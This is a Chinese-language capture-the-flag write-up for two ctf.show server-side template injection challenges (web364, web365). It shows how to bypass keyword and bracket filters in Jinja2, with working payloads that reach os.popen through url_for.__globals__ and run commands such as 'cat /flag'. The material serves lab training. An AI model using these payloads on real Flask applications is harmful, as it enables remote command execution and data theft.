## 一句话概括

两道 Filter 题连着打：web364 **把 `request.args` 关键字拦了**，换成 `request.values` 即可；web365 **把中括号 `[]` 拦了**，改用 `__getitem__` 或直接**点号 `.` 访问**。

## 本题情景与解题手法

### 题目形态

延续 web363 的形态 —— 参数化 + 回显 `name`。差别在于**过滤规则一次比一次严**，逼着换等价写法。

## web364：`args` 被过滤 → 换 `values`

### 第一步：先确认能用哪个参数对象

写好的期望 payload 是：

```text
?a=os&b=popen&c=ls
&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```

发出去却没成功。于是用一句极简的探测确认 `args` 是否可用：

```text
?name={{args.__class__}}
```

**发现 `args` 被过滤** —— 说明拦截规则针对的是关键词 `args`。

### 第二步：替换成 `values`

`request.values` 是 GET + POST 参数的合集，功能上覆盖 `args`：

```text
?a=os&b=popen&c=ls
&name={{url_for.__globals__[request.values.a][request.values.b](request.values.c).read()}}
```

**得到想要的值，通过。**

> 原笔记另有一步"作为想要的 payload"记录为 `{{().url_for.__globals__['os']['popen']('ls').read()}}` —— 其中 `()` 与 `url_for` 之间不该有点号，正确形态就是下面的 `url_for.__globals__['os']['popen']`。

## web365：`[]` 被过滤 → `__getitem__` / 点号

### 第一步：把中括号换成 `__getitem__`

`[]` 被拦后，用它的底层实现 `__getitem__` 顶替：

```text
{{url_for.__globals__.__getitem__(request.values.a).__getitem__(request.values.b)(request.values.c).read()}}
```

对应关系：

| 原写法 | 绕过写法 |
|---|---|
| `__globals__[a]` | `__globals__.__getitem__(a)` |
| `[b]` | `.__getitem__(b)` |

> 原笔记手写时把点号漏掉了（写成 `url_for.__globals____getitem__(...)`），导致 payload 无法通过 —— 链式调用里**每个 `.__getitem__` 前面的点号不能少**。

### 第二步：怀疑 `values` 不存在，先验证

改完仍不通过，怀疑环境里没有 `request.values`。用一句直接打印验证：

```text
?name={{request.values}}
```

回显：

```text
# Hello

### CombinedMultiDict([ImmutableMultiDict([('name', '{{request.values}}')]), ImmutableMultiDict([])])
```

这说明：

- `request.values` **确实存在且可用**
- 它包含了 GET 参数 `name`
- 空括号 `ImmutableMultiDict([])` 表示没有 POST 数据

所以问题不在 `values`，而在 payload 的写法（漏点号）。

### 第三步：干脆不用 `[]`，改用点号

既然 `__globals__` 是个 dict，而 `os` 是合法标识符，就可以**直接点号访问**：

```text
?c=cat%20/flag&name={{url_for.__globals__.os.popen(request.values.c).read()}}
```

**通过。** 整条链里一个 `[]` 都没有。

### 第四步：为什么可以不用中括号

**点号 `.`（属性访问）和中括号 `[]`（键访问）在 Python 里等价**，但有重要区别：

**点号访问（属性访问）**

```python
url_for.__globals__.os.popen
```

- 直接访问对象的**属性**
- 语法更简洁
- **属性名必须是有效的标识符**（不能有空格、特殊字符）

**中括号访问（键访问）**

```python
url_for.__globals__['os']['popen']
```

- 访问字典的**键**
- 更灵活，键可以是任意字符串
- 可以包含空格、特殊字符等

**为什么 `os` 可以直接点出来**：因为 `os` 同时满足三点 ——

1. 是有效的 Python 标识符（只有字母）
2. 是 `__globals__` 字典中的一个键
3. 同时也是一个属性

对于字典 / 命名空间对象，两种方式等价：

```python
obj.attr  ≈  obj['attr']
```

**这在绕过里的意义**：

| 场景 | 可用 | 不可用 |
|---|---|---|
| `[]` 被过滤 | `__globals__.os` | `__globals__['os']` |
| 键名含特殊字符 | `__globals__['some-attr']` | `__globals__.some-attr`（无效标识符） |

### 注入手法一句话总结

> web364：`args` 关键字被拦 → 换 `request.values`。web365：`[]` 被拦 → 先试 `__getitem__`（注意点号别漏），确认 `values` 存在后，直接用**点号链** `url_for.__globals__.os.popen(request.values.c).read()` 一次到位。

| web365 | `[]` 被过滤，换 `__getitem__` | `?a=os&b=popen&c=ls&name={{url_for.__globals__.__getitem__(request.values.a).__getitem__(request.values.b)(request.values.c).read()}}` |

## 踩坑与备注

- **`args` 被过滤就换 `values`**：`request.values` = GET + POST 参数合集，是 `args` / `form` 的父集，覆盖需求且换了个关键词。
- **`__getitem__` 链容易漏点号**：`__globals__.__getitem__(a)` 里 `__globals__` 后面**必须有 `.`**。原笔记手写 payload 时点号被漏掉 / 被 Markdown 吞掉，是失败的直接原因。
- **点号与中括号的取舍**：键是合法标识符时优先用点号（短、少符号、不易被过滤）；键含特殊字符时才必须用中括号。
- **`{{request.values}}` 是个好用的探针**：它能直观打印出当前请求到底带进来哪些参数（GET 与 POST 分开列），怀疑"参数没传进去"时先打它一眼。
- **原题靶场为 `*.challenge.ctf.show` 子域**，属一次性地址，本文统一写作 `靶场地址`；命令中的空格在 URL 里要编码成 `%20`。
